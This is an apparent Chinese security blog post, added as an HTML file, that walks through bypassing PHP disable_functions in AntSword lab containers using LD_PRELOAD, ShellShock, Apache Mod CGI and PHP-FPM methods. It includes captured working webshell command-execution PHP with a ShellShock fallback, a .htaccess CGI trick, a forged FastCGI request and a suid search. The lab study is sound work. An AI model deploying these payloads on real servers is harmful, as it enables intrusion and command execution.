@@ -1,0 +1,1029 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - webshell绕过disable_functions</title>
+        <meta name="description" content="前言 学习webshell绕过disable_functions中的姿势 复现地址：bypass_disable_functions 整个复现过程下来，在windows wsl docker下编译compose文件鸡飞狗跳，各种奇奇怪怪的问题，换到纯linux ubuntu环境一路顺畅.... disable_func…">
+    <link rel="canonical" href="https://the0n3.top/pages/disfunc/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="webshell绕过disable_functions">
+    <meta property="og:description" content="前言 学习webshell绕过disable_functions中的姿势 复现地址：bypass_disable_functions 整个复现过程下来，在windows wsl docker下编译compose文件鸡飞狗跳，各种奇奇怪怪的问题，换到纯linux ubuntu环境一路顺畅.... disable_func…">
+    <meta property="og:url" content="https://the0n3.top/pages/disfunc/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/disable_func/00.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="webshell绕过disable_functions">
+    <meta name="twitter:description" content="前言 学习webshell绕过disable_functions中的姿势 复现地址：bypass_disable_functions 整个复现过程下来，在windows wsl docker下编译compose文件鸡飞狗跳，各种奇奇怪怪的问题，换到纯linux ubuntu环境一路顺畅.... disable_func…">
+        <meta name="twitter:image" content="https://the0n3.top/images/disable_func/00.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>webshell绕过disable_functions</h1>
+    <p>
+        <span class="meta">发布于: 2025-03-18 00:31</span>
+    </p>
+    <div class="post-body">
+        <h2>前言</h2>
+<p>学习webshell绕过disable_functions中的姿势</p>
+<p>复现地址：<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/">bypass_disable_functions</a></p>
+<p><img src="/images/disable_func/00.png" alt="00" decoding="async" width="1022" height="208"></p>
+<p>整个复现过程下来，在windows wsl docker下编译compose文件鸡飞狗跳，各种奇奇怪怪的问题，换到纯linux ubuntu环境一路顺畅....</p>
+<h2>disable_functions</h2>
+<p>在<code>php.ini</code>php配置文件中，有一个高级配置项<code>disable_functions</code>，可以禁用高危函数，并且不能通过<code>ini_set</code>函数修改</p>
+<p>学习大佬们的骚姿势，绕过限制</p>
+<h2>高危函数</h2>
+<p>尝试复现过程，发现禁用了很多函数，蚁剑连接木马后还是可以执行命令</p>
+<pre><code class="language-ini">disable_functions = exec, shell_exec, system, passthru, eval, assert, popen</code></pre>
+<p>尝试给蚁剑上代理，走8080端口，使用bp抓包，分析蚁剑流量</p>
+<p>蚁剑</p>
+<p><img src="/images/disable_func/1.png" alt="1" decoding="async" loading="lazy" width="610" height="296"></p>
+<p>burp</p>
+<p><img src="/images/disable_func/2.png" alt="2" decoding="async" loading="lazy" width="783" height="319"></p>
+<p>抓包</p>
+<p><img src="/images/disable_func/3.png" alt="3" decoding="async" loading="lazy" width="1264" height="992"></p>
+<p>格式化一下，分析</p>
+<pre><code class="language-php">function fe($f) {
+    $d = explode(",", @ini_get("disable_functions"));
+    if (empty($d)) { $d = array(); }
+    else { $d = array_map('trim', array_map('strtolower', $d)); }
+    return (function_exists($f) &amp;&amp; is_callable($f) &amp;&amp; !in_array($f, $d));
+}
+
+function runcmd($c) {
+    $ret = 0;
+    $d = dirname($_SERVER["SCRIPT_FILENAME"]);
+
+    if (fe('system')) { @system($c, $ret); }
+    elseif (fe('passthru')) { @passthru($c, $ret); }
+    elseif (fe('shell_exec')) { print(@shell_exec($c)); }
+    elseif (fe('exec')) { @exec($c, $o, $ret); print(join("\n", $o)); }
+    elseif (fe('popen')) { $fp = @popen($c, 'r'); while (!@feof($fp)) { print(@fgets($fp, 2048)); } @pclose($fp); }
+    elseif (fe('proc_open')) {
+        $p = @proc_open($c, array(1 =&gt; array('pipe', 'w'), 2 =&gt; array('pipe', 'w')), $io);
+        while (!@feof($io[1])) { print(@fgets($io[1], 2048)); }
+        while (!@feof($io[2])) { print(@fgets($io[2], 2048)); }
+        @fclose($io[1]); @fclose($io[2]); @proc_close($p);
+    }
+    return $ret;
+}</code></pre>
+<p>可以看到，蚁剑在尝试使用<code>system</code>、<code>passthru</code>、<code>shell_exec</code>、<code>exec</code>、<code>popen</code>、<code>proc_open</code>等函数执行命令，只要有一个函数没有被禁用，就可以执行命令</p>
+<p>完善disable_functions</p>
+<pre><code class="language-ini">disable_functions = exec, shell_exec, system, passthru, eval, assert, proc_open, popen</code></pre>
+<p>在全部禁用后，可以看到，蚁剑不能执行命令</p>
+<p><img src="/images/disable_func/4.png" alt="4" decoding="async" loading="lazy" width="1024" height="640"></p>
+<p>一个更全面的禁用函数列表</p>
+<pre><code class="language-ini">disable_functions = pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system</code></pre>
+<h2>蚁剑插件</h2>
+<p>在蚁剑插件市场，下载<code>绕过disable_functions</code>插件
+<img src="/images/disable_func/5.png" alt="5" decoding="async" loading="lazy" width="934" height="658"></p>
+<p>在webshell管理界面，加载插件</p>
+<p><img src="/images/disable_func/6.png" alt="6" decoding="async" loading="lazy" width="1024" height="640"></p>
+<p>在插件界面，可以看到，插件有多种方式绕过disable_functions</p>
+<p><img src="/images/disable_func/7.png" alt="7" decoding="async" loading="lazy" width="1024" height="640"></p>
+<p>下面尽可能多的尝试</p>
+<h2>01 利用Linux环境变量LD_PRELOAD</h2>
+<h3>补充</h3>
+<p>LD_PRELOAD是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库</p>
+<p>windows和linux下的动态链接库格式</p>
+<ul>
+<li>dll = windows 的动态链接库文件 把一些功能函数封装在dll文件中，调用时导入调用即可</li>
+<li>so = linux 动态链接库文件</li>
+</ul>
+<p>LD_PRELOAD指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果，通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库</p>
+<h3>配置与部署</h3>
+<p>利用条件：</p>
+<ul>
+<li>linux系统</li>
+<li>putenv()函数没有被禁用</li>
+<li>可以调用子进程的函数<code>mail()</code>、<code>imap_mail()</code>、<code>mb_send_mail()</code>、<code>error_log()</code>等函数</li>
+<li>存在可写目录，可以上传so文件</li>
+</ul>
+<p><a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/1/">LD_PRELOAD 复现环境</a></p>
+<p>docker部署</p>
+<pre><code class="language-bash">docker compose up -d</code></pre>
+<p>在compose文件里，容器会映射到主机的<code>18080</code>端口</p>
+<p><img src="/images/disable_func/0.png" alt="0" decoding="async" loading="lazy" width="922" height="594"></p>
+<p>php.ini 配置如下:</p>
+<pre><code class="language-ini">disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system</code></pre>
+<h3>利用</h3>
+<p><strong>使用条件</strong></p>
+<ul>
+<li><code>Linux</code></li>
+<li><code>putenv</code></li>
+<li><code>mail</code> or <code>error_log</code> 本例中禁用了 <code>mail</code> 但未禁用 <code>error_log</code></li>
+<li>存在可写的目录, 需要上传 <code>.so</code> 文件</li>
+</ul>
+<p>使用蚁剑disable_functions插件，选择<code>LD_PRELOAD</code>模式</p>
+<p>蚁剑已经检测到<code>putenv</code>、<code>error_log</code>可用</p>
+<p><img src="/images/disable_func/7.png" alt="7" decoding="async" loading="lazy" width="1024" height="640"></p>
+<p>开日</p>
+<p><img src="/images/disable_func/8.png" alt="8" decoding="async" loading="lazy" width="1024" height="640"></p>
+<p>已经上传了代理php文件，通过这个<code>.antproxy.php</code>文件创建新进程和php-fpm进程通信，不受php.ini限制</p>
+<p>创建webshell副本，通过这个<code>antproxy.php</code>文件连接，密码同连接时的密码</p>
+<p><img src="/images/disable_func/9.png" alt="9" decoding="async" loading="lazy" width="411" height="150"></p>
+<p><img src="/images/disable_func/10.png" alt="10" decoding="async" loading="lazy" width="1024" height="640"></p>
+<p>连接后，终端里可以执行命令了，不过没有权限查看flag</p>
+<p><img src="/images/disable_func/11.png" alt="11" decoding="async" loading="lazy" width="1024" height="640"></p>
+<p>find命令可以发现存在suid命令</p>
+<pre><code class="language-bash">find / -perm -4000 -type f 2&gt;/dev/null</code></pre>
+<p><img src="/images/disable_func/12.png" alt="12" decoding="async" loading="lazy" width="1024" height="640"></p>
+<h3>原理</h3>
+<ul>
+<li>上传恶意so文件</li>
+<li>putenv函数设置LD_PRELOAD环境变量，劫持函数</li>
+</ul>
+<p>分析上传的so文件，其中有一句命令</p>
+<p><img src="/images/disable_func/13.png" alt="13" decoding="async" loading="lazy" width="1024" height="640"></p>
+<pre><code class="language-bash">/bin/sh php -n -s 127.0.0.1:60199 -t /var/www/html</code></pre>
+<ul>
+<li><code>/bin/sh</code>执行<code>php</code></li>
+<li><code>-n</code>不加载php.ini配置文件 </li>
+<li><code>-s</code>使用php内置web服务器，监听在60199端口</li>
+<li><code>-t</code>表示指定目录 /var/www/html</li>
+</ul>
+<p>再看一下<code>antproxy.php</code>文件</p>
+<p>展示部分代码</p>
+<p><img src="/images/disable_func/9.png" alt="9" decoding="async" loading="lazy" width="411" height="150"></p>
+<p>这个php把请求转发到上面使用php开启的内置web服务器的61780端口，进行处理请求，因此整个流程绕过了php.ini的限制</p>
+<h2>02 ShellShock</h2>
+<h3>原理</h3>
+<p>引用<a href="https://www.geekby.site/">Geekby</a>师傅博客</p>
+<p><img src="/images/disable_func/15.png" alt="15" decoding="async" loading="lazy" width="826" height="393"></p>
+<p>关键：PHP 里的某些函数（例如：mail()、imap_mail()）能调用 popen 或其他能够派生 bash 子进程的函数，可以通过这些函数来触发破壳漏洞(CVE-2014-6271)执行命令。</p>
+<p>我去，精彩。利用可以创建bash子进程的函数，触发破壳漏洞，利用破壳漏洞定义函数执行命令，有意思</p>
+<h3>配置与部署</h3>
+<p>php.ini 配置如下</p>
+<pre><code class="language-ini">disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system</code></pre>
+<p><a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/2/">ShellShock 复现环境</a></p>
+<p>docker部署</p>
+<pre><code class="language-bash">docker compose up -d</code></pre>
+<p>在compose文件里，容器会映射到主机的<code>18080</code>端口</p>
+<h3>利用</h3>
+<p>利用条件：</p>
+<ul>
+<li>Linux 操作系统</li>
+<li>putenv</li>
+<li>mail or error_log 本例中禁用了 mail 但未禁用 error_log</li>
+<li>/bin/bash 存在 CVE-2014-6271 漏洞</li>
+<li>/bin/sh -&gt; /bin/bash sh 默认的 shell 是 bash</li>
+</ul>
+<p>AntSword 虚拟终端中已经集成了对 ShellShock 的利用, 可以在虚拟终端直接执行命令</p>
+<p><img src="/images/disable_func/14.png" alt="14" decoding="async" loading="lazy" width="728" height="221"></p>
+<p>可以在上面蚁剑流量分析里找到<code>shellshock</code>的绕过姿势</p>
+<p>这里是抓取的一份蚁剑webshell终端执行ls命令的流量</p>
+<pre><code class="language-php">&lt;?php
+@ini_set("display_errors", "0");
+@set_time_limit(0);
+
+// 绕过 open_basedir 限制
+$opdir = @ini_get("open_basedir");
+if ($opdir) {
+    $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);
+    $oparr = preg_split("/[;|:]/", $opdir);
+    @array_push($oparr, $ocwd, sys_get_temp_dir());
+    foreach ($oparr as $item) {
+        if (!@is_writable($item)) continue;
+        $tmdir = $item . "/.4ce2376c";
+        @mkdir($tmdir);
+        if (!@file_exists($tmdir)) continue;
+        @chdir($tmdir);
+        @ini_set("open_basedir", "..");
+        $cntarr = @preg_split("/[\\\\|\/\/]/", $tmdir);
+        for ($i = 0; $i &lt; sizeof($cntarr); $i++) {
+            @chdir("..");
+        }
+        @ini_set("open_basedir", "/");
+        @rmdir($tmdir);
+        break;
+    }
+}
+
+function asenc($out) {
+    return $out;
+}
+
+function asoutput() {
+    $output = ob_get_contents();
+    ob_end_clean();
+    echo "5b8e" . "a5cdd";
+    echo @asenc($output);
+    echo "542ba" . "3c7833";
+}
+
+ob_start();
+try {
+    // 解析 base64 编码的参数
+    $p = base64_decode(substr($_POST["c045fb6cb12372"], 2));
+    $s = base64_decode(substr($_POST["jbb3acf47e78a1"], 2));
+    $envstr = @base64_decode(substr($_POST["c58e587ec1d00d"], 2));
+
+    $d = dirname($_SERVER["SCRIPT_FILENAME"]);
+    $c = substr($d, 0, 1) == "/" ? "-c \"{$s}\"" : "/c \"{$s}\"";
+
+    if (substr($d, 0, 1) == "/") {
+        @putenv("PATH=" . getenv("PATH") . ":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
+    } else {
+        @putenv("PATH=" . getenv("PATH") . ";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/");
+    }
+
+    if (!empty($envstr)) {
+        $envarr = explode("|||asline|||", $envstr);
+        foreach ($envarr as $v) {
+            if (!empty($v)) {
+                @putenv(str_replace("|||askey|||", "=", $v));
+            }
+        }
+    }
+
+    $r = "{$p} {$c}";
+
+    function fe($f) {
+        $d = explode(",", @ini_get("disable_functions"));
+        if (empty($d)) {
+            $d = array();
+        } else {
+            $d = array_map('trim', array_map('strtolower', $d));
+        }
+        return (function_exists($f) &amp;&amp; is_callable($f) &amp;&amp; !in_array($f, $d));
+    }
+
+    function runshellshock($d, $c) {
+        if (substr($d, 0, 1) == "/" &amp;&amp; fe('putenv') &amp;&amp; (fe('error_log') || fe('mail'))) {
+            if (strstr(readlink("/bin/sh"), "bash") !== FALSE) {
+                $tmp = tempnam(sys_get_temp_dir(), 'as');
+                putenv("PHP_LOL=() { :; }; {$c} &gt;{$tmp} 2&gt;&amp;1");
+                if (fe('error_log')) {
+                    error_log("a", 1);
+                } else {
+                    mail("a@127.0.0.1", "", "", "-bv");
+                }
+            } else {
+                return False;
+            }
+            $output = @file_get_contents($tmp);
+            @unlink($tmp);
+            if ($output != "") {
+                print($output);
+                return True;
+            }
+        }
+        return False;
+    }
+
+    function runcmd($c) {
+        $ret = 0;
+        $d = dirname($_SERVER["SCRIPT_FILENAME"]);
+
+        if (fe('system')) {
+            @system($c, $ret);
+        } elseif (fe('passthru')) {
+            @passthru($c, $ret);
+        } elseif (fe('shell_exec')) {
+            print(@shell_exec($c));
+        } elseif (fe('exec')) {
+            @exec($c, $o, $ret);
+            print(join("\n", $o));
+        } elseif (fe('popen')) {
+            $fp = @popen($c, 'r');
+            while (!@feof($fp)) {
+                print(@fgets($fp, 2048));
+            }
+            @pclose($fp);
+        } elseif (fe('proc_open')) {
+            $p = @proc_open($c, array(1 =&gt; array('pipe', 'w'), 2 =&gt; array('pipe', 'w')), $io);
+            while (!@feof($io[1])) {
+                print(@fgets($io[1], 2048));
+            }
+            while (!@feof($io[2])) {
+                print(@fgets($io[2], 2048));
+            }
+            @fclose($io[1]);
+            @fclose($io[2]);
+            @proc_close($p);
+        } elseif (runshellshock($d, $c)) {
+            return $ret;
+        } elseif (substr($d, 0, 1) != "/" &amp;&amp; @class_exists("COM")) {
+            $w = new COM('WScript.shell');
+            $e = $w-&gt;exec($c);
+            $so = $e-&gt;StdOut();
+            $ret .= $so-&gt;ReadAll();
+            $se = $e-&gt;StdErr();
+            $ret .= $se-&gt;ReadAll();
+            print($ret);
+        } else {
+            $ret = 127;
+        }
+        return $ret;
+    }
+
+    $ret = @runcmd($r . " 2&gt;&amp;1");
+    print($ret != 0 ? "ret={$ret}" : "");
+} catch (Exception $e) {
+    echo "ERROR://" . $e-&gt;getMessage();
+}
+asoutput();
+die();
+?&gt;</code></pre>
+<p>其中有关于<code>shellshock</code>的部分，就是说，蚁剑已经默认支持<code>shellshock</code>的绕过姿势，不需要额外的插件来实现，直接终端执行命令即可</p>
+<pre><code class="language-php">    function runshellshock($d, $c) {
+        if (substr($d, 0, 1) == "/" &amp;&amp; fe('putenv') &amp;&amp; (fe('error_log') || fe('mail'))) {
+            if (strstr(readlink("/bin/sh"), "bash") !== FALSE) {
+                $tmp = tempnam(sys_get_temp_dir(), 'as');
+                putenv("PHP_LOL=() { :; }; {$c} &gt;{$tmp} 2&gt;&amp;1");
+                if (fe('error_log')) {
+                    error_log("a", 1);
+                } else {
+                    mail("a@127.0.0.1", "", "", "-bv");
+                }
+            } else {
+                return False;
+            }
+            $output = @file_get_contents($tmp);
+            @unlink($tmp);
+            if ($output != "") {
+                print($output);
+                return True;
+            }
+        }
+        return False;
+    }</code></pre>
+<h2>03 Apache Mod CGI</h2>
+<h3>原理</h3>
+<p>apache通过cgi处理请求，每个请求都会生成一个独立的进程，导致系统资源被大量消耗，如果选择把php作为一个模块<code>apache_mod_php</code>时，PHP 代码在 Apache 进程内执行，不需要额外为每一个请求创建独立的进程，高效提高资源利用率，可以通过<code>php.ini</code>配置php模块。</p>
+<p>如果 <code>Apache</code> 服务器启用了 <code>Mod CGI</code>，那么apache服务器可以直接运行 <code>.cgi</code> 或 <code>.sh</code> 脚本，攻击者可以创建一个包含恶意代码的 <code>CGI</code> 脚本，让 <code>Apache</code> 直接执行，调用系统命令，整个过程与php模块无关，不受php.ini限制</p>
+<h3>配置与部署</h3>
+<p>php.ini 配置如下:</p>
+<pre><code class="language-ini">disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv</code></pre>
+<blockquote>
+<p>相比 LD_PRELOAD姿势 多了 <code>putenv</code></p>
+</blockquote>
+<p><a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/3/">ShellShock 复现环境</a></p>
+<p>docker部署</p>
+<pre><code class="language-bash">docker compose up -d</code></pre>
+<p>在compose文件里，容器会映射到主机的<code>18080</code>端口</p>
+<p><strong>使用条件</strong></p>
+<ul>
+<li><code>Linux</code></li>
+<li>Apache + PHP (apache 使用 apache_mod_php)</li>
+<li>Apache 开启了 <code>cgi</code>, <code>rewrite</code></li>
+<li>Web 目录给了 <code>AllowOverride</code> 权限</li>
+<li>当前目录可写</li>
+</ul>
+<h3>利用</h3>
+<p>正常连接后，无法执行命令</p>
+<p><img src="/images/disable_func/16.png" alt="16" decoding="async" loading="lazy" width="807" height="148"></p>
+<p>使用蚁剑disable_functions插件，选择<code>Apache Mod CGI</code>模式</p>
+<p>可以看到，利用插件前，左侧参数都处于<code>NO</code>状态</p>
+<p><img src="/images/disable_func/17.png" alt="17" decoding="async" loading="lazy" width="1024" height="613"></p>
+<p>使用后，左侧参数都处于<code>YES</code>状态，并且可以执行命令了</p>
+<p><img src="/images/disable_func/18.png" alt="18" decoding="async" loading="lazy" width="1024" height="613"></p>
+<p>这个插件做了什么？修改了配置文件吗？验证一下</p>
+<p><strong>查找最近修改的10个文件并按时间排序</strong></p>
+<pre><code class="language-bash">find / -type f -exec ls -lt {} + | head -n 10</code></pre>
+<p><img src="/images/disable_func/19.png" alt="19" decoding="async" loading="lazy" width="1395" height="511"></p>
+<p>最近修改的文件有<code>.htaccess</code>文件、<code>shell.ant</code>文件</p>
+<p><code>.htaccess</code>文件把ant结尾文件作为cgi文件处理</p>
+<pre><code class="language-ini">Options +ExecCGI
+AddHandler cgi-script .ant</code></pre>
+<p>在<code>shell.ant</code>文件里，是刚刚执行的命令</p>
+<pre><code class="language-bash">#!/bin/sh
+echo&amp;&amp;cd "/var/www/html";find / -type f -exec ls -lt {} + | head -n 10;echo abc01;pwd;echo 798e305c6</code></pre>
+<p><img src="/images/disable_func/20.png" alt="20" decoding="async" loading="lazy" width="835" height="158"></p>
+<h2>04 PHP-FPM 利用 LD_PRELOAD</h2>
+<h3>原理</h3>
+<ul>
+<li>没有禁用<code>putenv</code>函数，可以使用<code>putenv</code>函数设置<code>LD_PRELOAD</code>环境变量，劫持函数</li>
+<li>存在可写目录，可以上传so文件</li>
+<li>mail()、imap_mail()、mb_send_mail()、error_log()等函数可用，可以调用子进程</li>
+</ul>
+<p>php.ini 配置如下:</p>
+<pre><code class="language-ini">disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system</code></pre>
+<p>没有禁用<code>putenv</code>函数</p>
+<h3>配置与部署</h3>
+<p><a href="https://github.com/Apursuit/AntSword-Labs/tree/master/bypass_disable_functions/4/">PHP-FPM 利用 LD_PRELOAD 复现环境</a></p>
+<p>docker部署</p>
+<pre><code class="language-bash">docker compose up -d</code></pre>
+<p>在compose文件里，容器会映射到主机的<code>18080</code>端口</p>
+<h3>利用</h3>
+<p><strong>使用条件</strong></p>
+<ul>
+<li>没有禁用<code>putenv</code>函数，可以使用<code>putenv</code>函数设置<code>LD_PRELOAD</code>环境变量，劫持函数</li>
+<li>存在可写目录，可以上传so文件</li>
+<li>mail()、imap_mail()、mb_send_mail()、error_log()等函数可用，可以调用子进程</li>
+</ul>
+<p>检测到<code>putenv</code>、<code>error_log</code>、<code>file_put_contents</code>函数可用</p>
+<p><img src="/images/disable_func/25.png" alt="25" decoding="async" loading="lazy" width="1027" height="598"></p>
+<p>开日</p>
+<p><img src="/images/disable_func/26.png" alt="26" decoding="async" loading="lazy" width="1027" height="598"></p>
+<p><img src="/images/disable_func/27.png" alt="27" decoding="async" loading="lazy" width="1027" height="598"></p>
+<h2>05 PHP-FPM</h2>
+<h3>原理</h3>
+<p>Nginx、FastCGI、PHP-FPM的工作流程</p>
+<ul>
+<li>客户端请求：</li>
+</ul>
+<p>客户端发送一个 HTTP 请求到 Nginx，例如 <a href="http://example.com/index.php">http://example.com/index.php</a></p>
+<ul>
+<li>Nginx 处理：</li>
+</ul>
+<p>Nginx 根据配置文件判断这是一个 PHP 请求，于是将请求通过 FastCGI 协议转发给 PHP-FPM</p>
+<ul>
+<li>PHP-FPM 处理：</li>
+</ul>
+<p>PHP-FPM 接收到请求后，解析 FastCGI 协议，找到对应的 PHP 脚本（如 /var/www/html/index.php），执行该脚本</p>
+<ul>
+<li>返回结果：</li>
+</ul>
+<p>PHP-FPM 将脚本的执行结果通过 FastCGI 协议返回给 Nginx，Nginx 再将结果返回给客户端。</p>
+<p>可以上传一个php文件，伪造一份fastcgi协议封装的请求给php-fpm，php-fpm会解析这个请求，执行php文件</p>
+<p>举例，这里是一个伪造的fastcgi协议请求</p>
+<pre><code class="language-json">{
+    'GATEWAY_INTERFACE': 'FastCGI/1.0',
+    'REQUEST_METHOD': 'GET',
+    'PHP_VALUE': 'auto_prepend_file = php://input',
+    'PHP_ADMIN_VALUE': 'extension_dir = /tmp/evil.so',
+    'SCRIPT_FILENAME': '/var/www/html/index.php',
+    'SCRIPT_NAME': '/index.php',
+    'QUERY_STRING': '?a=1&amp;b=2',
+    'REQUEST_URI': '/index.php?a=1&amp;b=2',
+    'DOCUMENT_ROOT': '/var/www/html',
+    'SERVER_SOFTWARE': 'php/fcgiclient',
+    'REMOTE_ADDR': '127.0.0.1',
+    'REMOTE_PORT': '12345',
+    'SERVER_ADDR': '127.0.0.1',
+    'SERVER_PORT': '80',
+    'SERVER_NAME': "localhost",
+    'SERVER_PROTOCOL': 'HTTP/1.1'
+}</code></pre>
+<p>分析这份fastcgi报文的关键点：</p>
+<ul>
+<li>要注意<code>SCRIPT_FILENAME</code>字段的php文件一定要存在，因为这份请求是要交给<code>SCRIPT_FILENAME</code>字段的php文件执行的</li>
+<li>字段<code>PHP_VALUE</code>可以定义<code>php.ini</code>的配置项，使用php配置文件里的<code>auto_prepend_file</code>配置项搭配<code>php://input</code>伪协议来实现文件包含</li>
+<li>字段<code>PHP_ADMIN_VALUE</code>可以设置除<code>disable_functions</code>外的配置项，可以配置<code>extension_dir</code>字段，达到在php启动时劫持动态加载的动态链接库</li>
+</ul>
+<p>可以看到正常的php扩展目录</p>
+<p><img src="/images/disable_func/21.png" alt="21" decoding="async" loading="lazy" width="1124" height="166"></p>
+<p>在第三点里，可以间接体现出<code>LD_PRELOAD</code>的绕过姿势</p>
+<h3>配置与部署</h3>
+<p>php.ini 配置如下:</p>
+<pre><code class="language-ini">disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv</code></pre>
+<p>相比 04 禁用了 <code>putenv</code> 函数</p>
+<p><a href="https://github.com/Apursuit/AntSword-Labs/tree/master/bypass_disable_functions/5/">php-fpm 复现环境</a></p>
+<p>docker部署</p>
+<pre><code class="language-bash">docker compose up -d</code></pre>
+<p>在compose文件里，容器会映射到主机的<code>18080</code>端口</p>
+<h3>利用</h3>
+<p><strong>使用条件</strong></p>
+<ul>
+<li><code>Linux</code></li>
+<li><code>PHP-FPM</code></li>
+<li>存在可写目录，可以上传so文件</li>
+</ul>
+<p>正常连接后，无法执行命令</p>
+<p>使用蚁剑disable_functions插件，选择<code>fastcgi/PHP-FPM</code>模式</p>
